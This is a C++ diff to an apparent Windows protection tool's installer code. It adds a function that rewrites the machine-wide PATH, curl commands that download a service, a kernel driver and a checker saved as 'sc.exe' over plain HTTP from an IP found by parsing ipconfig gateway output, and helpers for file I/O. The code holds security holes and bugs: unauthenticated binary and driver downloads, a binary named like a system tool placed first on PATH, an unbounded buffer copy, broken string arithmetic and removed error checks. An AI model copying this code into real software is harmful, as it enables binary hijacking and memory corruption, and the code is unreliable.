@@ -267,6 +267,79 @@ BOOL PerformCommand(const char* CommandArr[], const char* Replacements[], const 
 }
 
 
+DWORD AddPathToEnvVariable(const WCHAR* NewPathToAdd) {
+    WCHAR NewEnvironmentVariable[1000] = { 0 };
+    WCHAR CurrentEnvironmentVariable[1000] = { 0 };
+    HKEY RegistryKeyHandle = { 0 };
+    DWORD ExistingPathSize = 0;
+    SIZE_T CurrentNewPathOffset = 0;
+    SIZE_T LastNewPathOffset = 0;
+
+    std::wstring NewVariableValue;
+    std::wstring ExistingVariableValue;
+    std::wstring PathToRemove(NewPathToAdd + L';');
+    std::wstring PathToRemoveFinal(NewPathToAdd);
+
+
+    // Open registry key of environment variables configurations:
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
+        L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", 0,
+        KEY_ALL_ACCESS, &RegistryKeyHandle) != ERROR_SUCCESS) {
+        return GetLastError();
+    }
+
+
+    // Query the current PATH size and value in the registry key:
+    if (RegQueryValueEx(RegistryKeyHandle, L"Path", NULL, NULL, NULL,
+        &ExistingPathSize) != ERROR_SUCCESS) {
+        RegCloseKey(RegistryKeyHandle);
+        return GetLastError();
+    }
+    if (RegQueryValueExW(RegistryKeyHandle, L"Path", NULL, NULL,
+        (LPBYTE)CurrentEnvironmentVariable, &ExistingPathSize) != ERROR_SUCCESS) {
+        RegCloseKey(RegistryKeyHandle);
+        return GetLastError();
+    }
+
+
+    // Check if path is not already at the top of the PATH variable, if so - nothing to add:
+    ExistingVariableValue = CurrentEnvironmentVariable;
+    if (ExistingVariableValue.find(NewPathToAdd, 0) == 0) {
+
+        // Environment variable starts with my path already:
+        NewVariableValue.append(ExistingVariableValue.c_str());
+    }
+    else {
+
+        // Environment variable does not start with my path / it does not exist here:
+        CurrentNewPathOffset = ExistingVariableValue.find(PathToRemoveFinal, 0);
+        while (CurrentNewPathOffset != std::wstring::npos) {
+            ExistingVariableValue.erase(CurrentNewPathOffset, PathToRemoveFinal.length());
+            CurrentNewPathOffset = ExistingVariableValue.find(PathToRemoveFinal, 0);
+        }
+        NewVariableValue.append(NewPathToAdd);
+        NewVariableValue.append(L";");
+        NewVariableValue.append(ExistingVariableValue);
+    }
+
+
+    // Set the value of the PATH value to the new batch of paths:
+    if (RegSetValueExW(RegistryKeyHandle, L"Path", 0, REG_EXPAND_SZ,
+        (BYTE*)NewVariableValue.c_str(), (wcslen(NewVariableValue.c_str()) + 1) *
+        sizeof(WCHAR)) != ERROR_SUCCESS) {
+        RegCloseKey(RegistryKeyHandle);
+        return GetLastError();
+    }
+    RegCloseKey(RegistryKeyHandle);
+
+
+    // Send a global signal that the environment variables were changed (to updating them):
+    SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0, (LPARAM)L"Environment",
+        SMTO_ABORTIFHUNG, 5000, NULL);
+    return 0;
+}
+
+
 int VerfifyDepDirs(WCHAR* AppDataPath) {
     WCHAR ServicePath[MAX_PATH] = { 0 };
     WCHAR DriverCheckerPath[MAX_PATH] = { 0 };
@@ -318,10 +391,10 @@ int VerfifyDepDirs(WCHAR* AppDataPath) {
 
 
     // Create directories (if dont exist):
-    if (_wsystem(ServiceCommandPath) == -1 || _wsystem(DriverCheckerCommandPath) == -1 ||
-        _wsystem(KernelDriverCommandPath) == -1 || _wsystem(ExtraFilesCommandPath) == -1) {
-        return GetLastError();
-    }
+    _wsystem(ServiceCommandPath);
+    _wsystem(DriverCheckerCommandPath);
+    _wsystem(KernelDriverCommandPath);
+    _wsystem(ExtraFilesCommandPath);
     return 0;
 }
 
@@ -336,15 +409,163 @@ int VerfifyDepFiles(const char* FileHostIp, WCHAR* AppDataPath) {
 
     // Execute commands with regular characters AppData local path and file host IP address:
     const char* FileCommands[] = { "cd `\\ProtectionSolution\\Service\\ && ",
-        "if not exist ProtectionService.exe curl http://~:45454/ProtectionService/x64/Release/ProtectionService.exe --output ProtectionService.exe && ",
+        "if not exist ProtectionService.exe curl http://~:8080/ProtectionService/x64/Release/ProtectionService.exe --output ProtectionService.exe && ",
          "cd `\\ProtectionSolution\\KernelDriver\\ && ",
-        "if not exist ProtectionDriver.sys curl http://~:45454/ProtectionDriver/x64/Release/ProtectionDriver.sys --output ProtectionDriver.sys && ",
-         "cd `\\ProtectionSolution\\DriverChecker\\" };
+        "if not exist ProtectionDriver.sys curl http://~:8080/ProtectionDriver/x64/Release/ProtectionDriver.sys --output ProtectionDriver.sys && ",
+         "cd `\\ProtectionSolution\\DriverChecker\\ && ",
+        "if not exist sc.exe curl http://~:8080/ProtectionDriverChecker/x64/Release/ProtectionDriverChecker.exe --output sc.exe" };
     const char* ReplaceArr[2] = { AppDataPathReg, FileHostIp };
     const char* SymbolsArr = "`~";
-    const int TotalCommands = 5;
+    const int TotalCommands = 6;
     if (!PerformCommand(FileCommands, ReplaceArr, SymbolsArr, TotalCommands, 2)) {
         return (int)GetLastError();
     }
     return 0;
+}
+
+
+int OperateOnFile(char* FilePath, HANDLE* FileHandle, PVOID* FileData,
+    ULONG64* FileDataSize, BOOL IsWrite, BOOL ShouldNullTerm) {
+    DWORD OperationOutput = 0;
+    if (FileHandle == NULL || FilePath == NULL || FileData == NULL || FileDataSize == NULL) {
+        return -1;
+    }
+    if (IsWrite) {
+        *FileHandle = CreateFileA(FilePath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    }
+    else {
+        *FileHandle = CreateFileA(FilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    }
+    if (*FileHandle == INVALID_HANDLE_VALUE) {
+        return 1;  // Invalid handle
+    }
+    *FileDataSize = GetFileSize(*FileHandle, 0);
+    if (*FileDataSize == 0) {
+        CloseHandle(*FileHandle);
+        return 2;  // File size = 0
+    }
+    *FileData = malloc(*FileDataSize + ShouldNullTerm);  // If null terminated: needs +1 character (TRUE = 1)
+    if (*FileData == NULL) {
+        CloseHandle(*FileHandle);
+        return 3;  // Malloc failed
+    }
+    if ((!IsWrite && (!ReadFile(*FileHandle, *FileData, *FileDataSize, &OperationOutput, NULL) ||
+        OperationOutput != *FileDataSize)) ||
+        (IsWrite && (!WriteFile(*FileHandle, *FileData, *FileDataSize, &OperationOutput, NULL) ||
+            OperationOutput != *FileDataSize))) {
+        CloseHandle(*FileHandle);
+        free(*FileData);
+        return 4;  // Actual operation failed
+    }
+    if (ShouldNullTerm) {
+        ((char*)(*FileData))[*FileDataSize] = '\0';
+    }
+    CloseHandle(*FileHandle);
+    return 0;
+}
+
+
+BOOL IsValidIp(char* Address) {
+    DWORD CurrChunkValue = 0;
+    if (Address == NULL || CountOccurrences(Address, '.') != 3) {
+        return FALSE;
+    }
+
+    for (int i = 0; i < strlen(Address); i++) {
+        if (Address[i] != '.') {
+            if (isdigit(Address[i]) == 0 && Address[i]) {
+                return FALSE;
+            }
+            CurrChunkValue *= 10;
+            CurrChunkValue += (Address[i] - 0x30);
+        }
+        else {
+            if (!(CurrChunkValue >= 0 && CurrChunkValue <= 255)) {
+                return FALSE;
+            }
+            CurrChunkValue = 0;
+        }
+    }
+    return TRUE;
+}
+
+
+char* ExtractGateways(char* IpConfigOutput) {
+    SIZE_T NextGatewayOffset = 0;
+    ULONG64 CurrentAddressSize = 0;
+    ULONG64 OccurenceOffset = 0;
+    ULONG64 GatewayBufferSize = 0;
+    char CurrentAddress[MAX_PATH] = { 0 };
+    char* GatewayBuffer = NULL;
+    char* TemporaryBuffer = NULL;
+    const char* GatewayIdentifier = "Default Gateway . . . . . . . . . : ";
+    std::string StringOutput(IpConfigOutput);
+    if (IpConfigOutput == NULL) {
+        return NULL;
+    }
+
+    NextGatewayOffset = StringOutput.find(GatewayIdentifier, 0);
+    while (NextGatewayOffset != std::string::npos) {
+        OccurenceOffset = NextGatewayOffset + strlen(GatewayIdentifier);
+        if (StringOutput.c_str()[OccurenceOffset] == '\r' &&
+            StringOutput.c_str()[OccurenceOffset + 1] == '\n') {
+            goto NextGateway;  // No gateway address specified
+        }
+
+        // Copy current address:
+        for (CurrentAddressSize = 0; !(StringOutput.c_str()[OccurenceOffset + CurrentAddressSize] == '\r' &&
+            StringOutput.c_str()[OccurenceOffset + CurrentAddressSize + 1] == '\n'); CurrentAddressSize++) {
+            CurrentAddress[CurrentAddressSize] = StringOutput.c_str()[OccurenceOffset + CurrentAddressSize];
+        }
+        CurrentAddress[CurrentAddressSize] = '\0';
+
+
+        // Only handle valid IPv4 addresses:
+        if (IsValidIp(CurrentAddress)) {
+            if (GatewayBuffer == NULL) {
+                GatewayBuffer = (char*)malloc(CurrentAddressSize + 1);  // Always null terminate
+                if (GatewayBuffer == NULL) {
+                    return NULL;
+                }
+                RtlCopyMemory(GatewayBuffer, CurrentAddress, CurrentAddressSize + 1);
+            }
+            else {
+                TemporaryBuffer = (char*)malloc(strlen(GatewayBuffer) + CurrentAddressSize + 2);  // +2 for null terminator and '~'
+                if (TemporaryBuffer == NULL) {
+                    free(GatewayBuffer);
+                    return NULL;
+                }
+                RtlCopyMemory(TemporaryBuffer, GatewayBuffer, strlen(GatewayBuffer));
+                TemporaryBuffer[strlen(GatewayBuffer)] = '~';
+                RtlCopyMemory(TemporaryBuffer + strlen(GatewayBuffer) + 1, CurrentAddress,
+                    CurrentAddressSize);
+                TemporaryBuffer[strlen(GatewayBuffer) + CurrentAddressSize + 1] = '\0';
+                free(GatewayBuffer);
+                GatewayBuffer = TemporaryBuffer;
+            }
+
+        }
+    NextGateway:
+        NextGatewayOffset = StringOutput.find(GatewayIdentifier, NextGatewayOffset + strlen(GatewayIdentifier));
+    }
+    return GatewayBuffer;
+}
+
+
+char* GetGatewayList() {
+    HANDLE FileHandle = INVALID_HANDLE_VALUE;
+    ULONG64 FileDataSize = 0;
+    char* FileData = NULL;
+    char* FilteredData = NULL;
+    system("ipconfig /all > IpConfigOutput");
+    if (OperateOnFile((char*)"IpConfigOutput", &FileHandle, (PVOID*)&FileData, &FileDataSize, FALSE, TRUE) != 0 ||
+        FileHandle == NULL) {
+        return NULL;
+    }
+    FilteredData = ExtractGateways(FileData);
+    free(FileData);
+    system("del /s /q IpConfigOutput");
+    return FilteredData;
 }
